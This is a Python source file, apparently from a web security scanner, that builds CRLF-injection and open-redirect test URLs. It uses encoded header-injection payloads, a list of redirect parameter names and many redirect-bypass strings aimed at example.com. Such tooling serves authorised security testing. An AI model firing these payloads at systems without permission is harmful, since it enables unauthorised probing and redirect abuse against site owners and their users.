import re
from urllib.parse import urlsplit, urlunsplit

crlf_payloads = [
    "%0d%0abounty:strike",
    "%0abounty:strike",
    "%0dbounty:strike",
    "%23%0dbounty:strike",
    "%3f%0dbounty:strike",
    "%250abounty:strike",
    "%25250abounty:strike",
    "%%0a0abounty:strike",
    "%3f%0dbounty:strike",
    "%23%0dbounty:strike",
    "%25%30abounty:strike",
    "%25%30%61bounty:strike",
    "%u000abounty:strike",
]

openredirect_params = [
    "action",
    "action_url",
    "allinurl",
    "backurl",
    "burl",
    "callback_url",
    "checkout_url",
    "clickurl",
    "continue",
    "data",
    "dest",
    "destination",
    "desturl",
    "ext",
    "forward",
    "forward_url",
    "go",
    "goto",
    "image_url",
    "jump",
    "jump_url",
    "link",
    "linkAddress",
    "location",
    "login",
    "logout",
    "next",
    "origin",
    "originUrl",
    "page",
    "pic",
    "q",
    "qurl",
    "recurl",
    "redir",
    "redirect",
    "Redirect",
    "RedirectUrl",
    "redirect_uri",
    "redirect_url",
    "request",
    "return",
    "returnTo",
    "ReturnUrl",
    "return_path",
    "return_to",
    "rit_url",
    "rurl",
    "service",
    "sp_url",
    "src",
    "success",
    "target",
    "to",
    "u",
    "u1",
    "uri",
    "url",
    "Url",
    "view",
]

openredirect_payloads = ['/%09/example.com', '/%2f%2fexample.com', '/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/', '/%5cexample.com', '/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d', '/.example.com', '//%09/example.com', '//%5cexample.com', '///%09/example.com', '///%5cexample.com', '////%09/example.com', '////%5cexample.com', '/////example.com', '/////example.com/', '////\\;@example.com', '////example.com/', '////example.com/%2e%2e', '////example.com/%2e%2e%2f', '////example.com/%2f%2e%2e', '////example.com/%2f..', '////example.com//', '///\\;@example.com', '///example.com', '///example.com/', '///example.com/%2e%2e', '///example.com/%2e%2e%2f', '///example.com/%2f%2e%2e', '///example.com/%2f..', '///example.com//', '//example.com', '//example.com/', '//example.com/%2e%2e', '//example.com/%2e%2e%2f', '//example.com/%2f%2e%2e', '//example.com/%2f..', '//example.com//', '//google%00.com', '//google%E3%80%82com', '//https:///example.com/%2e%2e', '//https://example.com/%2e%2e%2f', '//https://example.com//', '/<>//example.com', '//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com', '/\\/example.com&next=/\\/example.com&redirect=/\\/example.com&redirect_uri=/\\/example.com', 'Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com', '/\\/\\/example.com/', '/\\/example.com/', '/example.com/%2f%2e%2e', '/http://%67%6f%6f%67%6c%65%2e%63%6f%6d', '/http://example.com', '/http:/example.com', '/https:/%5cexample.com/', '/https://%09/example.com', '/https://%5cexample.com', '/https:///example.com/%2e%2e', '/https:///example.com/%2f%2e%2e', '/https://example.com', '/https://example.com/', '/https://example.com/%2e%2e', '/https://example.com/%2e%2e%2f', '/https://example.com/%2f%2e%2e', '/https://example.com/%2f..', '/https://example.com//', '/https:example.com', '/\\/example.com&next=/\\/example.com&redirect=/\\/example.com&redir=/\\/example.com&rurl=/\\/example.com&redirect_uri=/\\/example.com']



def build_openredirect_list(url: str):

    query_param_regex = re.compile(r"([\w\-\_]+=[\w\-\.\_]+)")

    u2 = urlsplit(url)

    if u2.query:
        re_keys = query_param_regex.findall(u2.query)
        keypairs= []
        payload_keypairs = []

        # Transform param=value to {"key": "param", "value": "param_value"}
        # Save all dics to list
        for keypair in re_keys:
            keypair_split = keypair.split("=")
            keypairs.append({"key": keypair_split[0], "value": keypair_split[1]})

        # Transform the keypair dict to {"key": "param": "value": "payload"}
        for op in openredirect_params:
            keys = [k["key"] for k in keypairs]
            if op.lower() in str(keys).lower():
                payload_keypairs.extend([{"key": op, "value": payload} for payload in openredirect_payloads])

        # Change original params to payload params in the URL
        for x in payload_keypairs:
            pattern = re.compile(x["key"] + r"=[\w\-\.\_]+&*")
            sub, count = re.subn(pattern, f"{x['key']}={x['value']}", url)
            if count > 0:
                yield {"url": sub, "type": "openredirect", "payload": x['value']}
    

    elif u2.path:
        path = u2.geturl()
        
        for op_param in openredirect_params:
            pattern = re.compile(fr"{op_param}\/[\w\_\-\.]+\/*")
            for p in openredirect_payloads:
                sub, count = re.subn(pattern, f"{op_param}/{p}", path)
                if count > 0:
                    yield {"url": sub, "type": "openredirect", "payload": p}


    else:
        # Append payload to end of URL
        for payload in openredirect_payloads:
            attack = f"{url}/{payload}"
            yield {"url": attack, "type": "openredirect", "payload": payload}


def build_crlf_list(url: str):
    value_regex = re.compile(r"\w=([\w\-\.\_]+)&*")

    f = value_regex.findall(url)
    u = urlsplit(url)
    attacks= []
    if urlsplit(url).query:
        query = urlsplit(url).query

        # sniper
        for payload in crlf_payloads:
            for p in f:
                attacks.append(query.replace(f"={p}", f"={payload}"))

        injected_queries = list(set(attacks))
        for query in injected_queries:
            injected_url = urlunsplit(u._replace(query=query))
            yield {"url": injected_url, "type": "crlf"}
 
    else:
        for payload in crlf_payloads:
            if not url.endswith("/"):
                injected_url = f"{url}/{payload}"
            else:
                injected_url = f"{url}{payload}"

            yield {"url": injected_url, "type": "crlf"}